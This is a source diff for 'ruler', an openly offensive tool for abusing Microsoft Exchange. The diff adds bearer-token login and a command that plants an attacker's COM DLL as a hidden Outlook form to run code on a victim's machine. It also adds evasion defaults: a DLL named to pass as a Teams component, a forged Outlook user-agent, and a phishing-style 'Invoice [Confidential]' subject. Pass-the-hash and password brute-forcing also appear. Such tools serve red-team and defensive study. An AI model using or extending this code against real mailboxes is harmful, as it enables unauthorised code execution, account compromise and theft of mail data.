@@ -20,7 +20,7 @@ import (
 	"github.com/urfave/cli"
 )
 
-//globals
+// globals
 var config utils.Session
 
 func exit(err error) {
@@ -37,7 +37,7 @@ func exit(err error) {
 	os.Exit(exitcode)
 }
 
-//function to perform an autodiscover
+// function to perform an autodiscover
 func discover(c *cli.Context) error {
 	if c.GlobalString("domain") == "" {
 		return fmt.Errorf("Required param --domain is missing")
@@ -56,19 +56,35 @@ func discover(c *cli.Context) error {
 	}
 
 	var err error
-	if c.Bool("dump") == true && c.GlobalString("password") == "" && c.GlobalString("hash") == "" {
-		fmt.Printf("Password: ")
-		var pass []byte
-		pass, err = gopass.GetPasswd()
-		if err != nil {
-			// Handle gopass.ErrInterrupted or getch() read error
-			return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
+	if c.Bool("dump") == true {
+		password := c.GlobalString("password")
+		hash := c.GlobalString("hash")
+		token := c.GlobalString("token")
+
+		if password != "" && hash != "" && token != "" {
+			return fmt.Errorf("Only one of password, hash, or token should be provided")
 		}
-		config.Pass = string(pass)
-	} else {
-		config.Pass = c.GlobalString("password")
-		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
-			return fmt.Errorf("Invalid hash provided. Hex decode failed")
+
+		if password != "" {
+			config.Pass = password
+		} else if hash != "" {
+			if config.NTHash, err = hex.DecodeString(hash); err != nil {
+				return fmt.Errorf("Invalid hash provided. Hex decode failed")
+			}
+		} else if token != "" {
+			config.BearerToken = token
+			if !c.GlobalBool("o365") {
+				return fmt.Errorf("Token only supported for Office365 (--o365)")
+			}
+		} else {
+			fmt.Printf("Password: ")
+			var pass []byte
+			pass, err = gopass.GetPasswd()
+			if err != nil {
+				// Handle gopass.ErrInterrupted or getch() read error
+				return fmt.Errorf("Password, hash or token required. Supply NTLM hash with --hash or bearer token with --token")
+			}
+			config.Pass = string(pass)
 		}
 	}
 
@@ -151,7 +167,7 @@ func discover(c *cli.Context) error {
 	return nil
 }
 
-//function to perform a bruteforce
+// function to perform a bruteforce
 func brute(c *cli.Context) error {
 	if c.String("users") == "" && c.String("userpass") == "" {
 		return fmt.Errorf("Either --users or --userpass required")
@@ -162,6 +178,9 @@ func brute(c *cli.Context) error {
 	}
 	if c.GlobalString("domain") == "" && c.GlobalString("url") == "" && c.GlobalBool("o365") == false {
 		return fmt.Errorf("Either --domain or --url required")
+	}
+	if c.GlobalString("token") != "" {
+		return fmt.Errorf("Token isn't supported for bruteforce")
 	}
 
 	utils.Info.Println("Starting bruteforce")
@@ -185,7 +204,7 @@ func brute(c *cli.Context) error {
 	return nil
 }
 
-//Function to add new rule
+// Function to add new rule
 func addRule(c *cli.Context) error {
 	utils.Info.Println("Adding Rule")
 
@@ -215,7 +234,7 @@ func addRule(c *cli.Context) error {
 	return nil
 }
 
-//Function to delete a rule
+// Function to delete a rule
 func deleteRule(c *cli.Context) error {
 	var ruleid []byte
 	var err error
@@ -264,7 +283,7 @@ func deleteRule(c *cli.Context) error {
 	return err
 }
 
-//Function to display all rules
+// Function to display all rules
 func displayRules(c *cli.Context) error {
 	utils.Info.Println("Retrieving Rules")
 	er := printRules()
@@ -272,8 +291,8 @@ func displayRules(c *cli.Context) error {
 	return er
 }
 
-//sendMessage sends a message to the user, using their own Account
-//uses supplied subject and body
+// sendMessage sends a message to the user, using their own Account
+// uses supplied subject and body
 func sendMessage(subject, body string) error {
 	propertyTags := make([]mapi.PropertyTag, 1)
 	propertyTags[0] = mapi.PidTagDisplayName
@@ -291,25 +310,37 @@ func sendMessage(subject, body string) error {
 	return nil
 }
 
-//Function to connect to the Exchange server
+// Function to connect to the Exchange server
 func connect(c *cli.Context) error {
 	var err error
+	password := c.GlobalString("password")
+	hash := c.GlobalString("hash")
+	token := c.GlobalString("token")
 
-	//if no password or hash was supplied, read from stdin
-	if c.GlobalString("password") == "" && c.GlobalString("hash") == "" && c.GlobalString("config") == "" {
+	if password != "" && hash != "" && token != "" {
+		return fmt.Errorf("Only one of password, hash, or token should be provided")
+	}
+
+	if password != "" {
+		config.Pass = password
+	} else if hash != "" {
+		if config.NTHash, err = hex.DecodeString(hash); err != nil {
+			return fmt.Errorf("Invalid hash provided. Hex decode failed")
+		}
+	} else if token != "" {
+		config.BearerToken = token
+		if !c.GlobalBool("o365") {
+			return fmt.Errorf("Token only supported for Office365 (--o365)")
+		}
+	} else {
 		fmt.Printf("Password: ")
 		var pass []byte
 		pass, err = gopass.GetPasswd()
 		if err != nil {
 			// Handle gopass.ErrInterrupted or getch() read error
-			return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
+			return fmt.Errorf("Password, hash or token required. Supply NTLM hash with --hash or bearer token with --token")
 		}
 		config.Pass = string(pass)
-	} else {
-		config.Pass = c.GlobalString("password")
-		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
-			return fmt.Errorf("Invalid hash provided. Hex decode failed")
-		}
 	}
 
 	//setup our autodiscover service
@@ -400,18 +431,21 @@ func connect(c *cli.Context) error {
 				return fmt.Errorf("Invalid hash provided. Hex decode failed")
 			}
 		}
+		if yamlConfig.Token != "" {
+			config.BearerToken = yamlConfig.Token
+		}
 
 		if config.User == "" && config.Email == "" {
 			return fmt.Errorf("Missing username and/or email argument. Use --domain (if needed), --username and --email or the --config")
 		}
 
-		if config.Pass == "" {
+		if config.Pass == "" && config.NTHash == nil && config.BearerToken == "" {
 			fmt.Printf("Password: ")
 			var pass []byte
 			pass, err = gopass.GetPasswd()
 			if err != nil {
 				// Handle gopass.ErrInterrupted or getch() read error
-				return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
+				return fmt.Errorf("Password, hash or token required. Supply NTLM hash with --hash or bearer token with --token")
 			}
 			config.Pass = string(pass)
 		}
@@ -574,7 +608,7 @@ func printRules() error {
 	return nil
 }
 
-//Function to display all addressbook entries
+// Function to display all addressbook entries
 func abkList(c *cli.Context) error {
 	utils.Trace.Println("Let's play addressbook")
 	if config.Transport == mapi.RPC {
@@ -621,7 +655,7 @@ func abkList(c *cli.Context) error {
 	return nil
 }
 
-//Function to display all addressbook entries
+// Function to display all addressbook entries
 func abkDump(c *cli.Context) error {
 	if config.Transport == mapi.RPC {
 		return fmt.Errorf("Address book support is currently limited to MAPI/HTTP")
@@ -668,7 +702,7 @@ func abkDump(c *cli.Context) error {
 	return nil
 }
 
-func createForm(c *cli.Context) error {
+func createScriptForm(c *cli.Context) error {
 	//first check that supplied command is valid
 	var command string
 	if c.String("input") != "" {
@@ -685,12 +719,14 @@ func createForm(c *cli.Context) error {
 		return fmt.Errorf("Command is too large. Maximum command size is 4096 characters.")
 	}
 
-	suffix := c.String("suffix")
+	formClassName := fmt.Sprintf("IPM.Note.%s", c.String("suffix"))
+	attachmentName := c.String("attachment")
+
 	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
 
 	utils.Trace.Println("Verifying that form does not exist.")
 	//check that form does not already exist
-	if err := forms.CheckForm(folderid, suffix); err != nil {
+	if err := forms.CheckForm(folderid, formClassName); err != nil {
 		return err
 	}
 	var rname, triggerword string
@@ -701,26 +737,28 @@ func createForm(c *cli.Context) error {
 		rname = "NORULE"
 	}
 
-	msgid, err := forms.CreateFormMessage(suffix, rname)
+	msgid, err := forms.CreateFormMessageForScript(formClassName, rname)
+
 	if err != nil {
 		return err
 	}
 
-	if err := forms.CreateFormAttachmentPointer(folderid, msgid); err != nil {
+	if err := forms.CreateFormAttachmentPointerForScript(folderid, msgid, attachmentName, formClassName); err != nil {
 		return err
 	}
 	if c.Bool("raw") == true {
-		if err := forms.CreateFormAttachmentForDeleteTemplate(folderid, msgid, command); err != nil {
+		if err := forms.CreateFormAttachmentForScriptWithDeleteTemplate(folderid, msgid, command, attachmentName); err != nil {
 			return err
 		}
 	} else {
-		if err := forms.CreateFormAttachmentTemplate(folderid, msgid, command); err != nil {
+		if err := forms.CreateFormAttachmentTemplateForString(folderid, msgid, command, attachmentName); err != nil {
 			return err
 		}
 	}
-	utils.Info.Println("Form created successfully")
 
-	if c.Bool("rule") == true {
+	utils.Info.Println("Form created successfully: ", formClassName)
+
+	if c.Bool("rule") {
 		utils.Info.Printf("Rule trigger set. Adding new rule with name %s\n", rname)
 		utils.Info.Printf("Adding new rule with trigger of %s\n", triggerword)
 
@@ -731,14 +769,61 @@ func createForm(c *cli.Context) error {
 			utils.Info.Println("Trigger rule created.")
 		}
 
-		if c.Bool("send") == false {
+		if c.Bool("send") {
 			utils.Info.Printf("Autosend disabled. You'll need to trigger the rule by sending an email with the keyword \"%s\" present in the subject. \n", triggerword)
 		}
 		c.Set("subject", triggerword)
 	}
 
 	//trigger the email if the send option is enabled
-	if c.Bool("send") == true {
+	if c.Bool("send") {
+		return triggerForm(c)
+	}
+	return nil
+}
+
+func createCOMForm(c *cli.Context) error {
+	dllBytes, err := utils.ReadFile(c.String("dll"))
+	if err != nil {
+		return err
+	}
+
+	formClassName := fmt.Sprintf("IPM.Note.%s", c.String("suffix"))
+	dllName := c.String("name")
+	clsidString := c.String("clsid")
+	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+
+	//check that form does not already exist
+	utils.Trace.Println("Verifying that form does not exist.")
+	if err := forms.CheckForm(folderid, formClassName); err != nil {
+		return err
+	}
+
+	clsid := utils.GenerateUUID()
+	if clsidString != "random" {
+		clsid, err = utils.StringToGuid(clsidString)
+		if err != nil {
+			return err
+		}
+	}
+
+	msgid, err := forms.CreateFormMessageForCOM(formClassName, clsid, c.String("suffix"), "", c.Bool("hidden"))
+	if err != nil {
+		return err
+	}
+
+	if err := forms.CreateFormAttachmentPointerForCOM(folderid, msgid, clsid, dllName); err != nil {
+		return err
+	}
+
+	if err := forms.CreateFormAttachmentForCOM(folderid, msgid, dllName, dllBytes); err != nil {
+		return err
+	}
+
+	utils.Info.Println("Form created successfully: ", formClassName)
+
+	//trigger the email if the send option is enabled
+	if c.Bool("send") {
 		return triggerForm(c)
 	}
 	return nil
@@ -1128,7 +1213,7 @@ func main() {
 
 	app.Name = "ruler"
 	app.Usage = "A tool to abuse Exchange Services"
-	app.Version = "2.4.0"
+	app.Version = "2.5.0"
 	app.Authors = []cli.Author{
 		cli.Author{
 			Name:  "Etienne Stalmans",
@@ -1174,6 +1259,11 @@ A tool by @_staaldraad and @sensepost to abuse Exchange Services.
 			Usage: "A NT hash for pass the hash",
 		},
 		cli.StringFlag{
+			Name:  "token",
+			Value: "",
+			Usage: "An Office 365 bearer token scoped for Outlook use",
+		},
+		cli.StringFlag{
 			Name:  "email,e",
 			Value: "",
 			Usage: "The target's email address",
@@ -1200,7 +1290,7 @@ A tool by @_staaldraad and @sensepost to abuse Exchange Services.
 		},
 		cli.StringFlag{
 			Name:  "useragent,ua",
-			Value: "ruler",
+			Value: "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.16529; Pro)",
 			Usage: "Custom User-Agent string",
 		},
 		cli.BoolFlag{
@@ -1545,8 +1635,8 @@ A tool by @_staaldraad and @sensepost to abuse Exchange Services.
 			Usage: "Interact with the forms function.",
 			Subcommands: []cli.Command{
 				{
-					Name:  "add",
-					Usage: "creates a new form. ",
+					Name:  "add-script",
+					Usage: "creates a new script based form. ",
 					Flags: []cli.Flag{
 						cli.StringFlag{
 							Name:  "suffix",
@@ -1562,6 +1652,11 @@ A tool by @_staaldraad and @sensepost to abuse Exchange Services.
 							Name:  "input,i",
 							Value: "",
 							Usage: "A path to a file containing the command to execute. This takes precidence over 'command'",
+						},
+						cli.StringFlag{
+							Name:  "attachment",
+							Value: "FS9201.tmp",
+							Usage: "The name of the attachment (for OpSec)",
 						},
 						cli.BoolFlag{
 							Name:  "send,s",
@@ -1600,7 +1695,65 @@ A tool by @_staaldraad and @sensepost to abuse Exchange Services.
 							utils.Error.Println(err)
 							cli.OsExiter(1)
 						}
-						err = createForm(c)
+						err = createScriptForm(c)
+						exit(err)
+						return nil
+					},
+				},
+				{
+					Name:  "add-com",
+					Usage: "creates a new COM based form. ",
+					Flags: []cli.Flag{
+						cli.StringFlag{
+							Name:  "suffix",
+							Value: "pew",
+							Usage: "A 3 character suffix for the form. Defaults to pew",
+						},
+						cli.StringFlag{
+							Name:  "dll,d",
+							Value: "",
+							Usage: "A path to a the COM DLL file to execute",
+						},
+						cli.StringFlag{
+							Name:  "clsid,c",
+							Value: "random",
+							Usage: "CLSID to use for the remote registration",
+						},
+						cli.StringFlag{
+							Name:  "name,n",
+							Value: "Microsoft.Teams.Shim.dll",
+							Usage: "The DLL name on the remote system",
+						},
+						cli.BoolFlag{
+							Name:  "hidden",
+							Usage: "Attempt to hide the form.",
+						},
+						cli.BoolFlag{
+							Name:  "send,s",
+							Usage: "Trigger the form once it's been created",
+						},
+						cli.StringFlag{
+							Name:  "body,b",
+							Value: "This message cannot be displayed in the previewer.\n\n\n\n\n",
+							Usage: "The email body you may wish to use",
+						},
+						cli.StringFlag{
+							Name:  "subject",
+							Value: "Invoice [Confidential]",
+							Usage: "The subject you wish to use, this should contain your trigger word",
+						},
+					},
+					Action: func(c *cli.Context) error {
+						if c.String("suffix") == "" {
+							return cli.NewExitError("The suffix is needs to be set.", 1)
+						}
+
+						err := connect(c)
+						if err != nil {
+							utils.Error.Println(err)
+							cli.OsExiter(1)
+						}
+						err = createCOMForm(c)
 						exit(err)
 						return nil
 					},
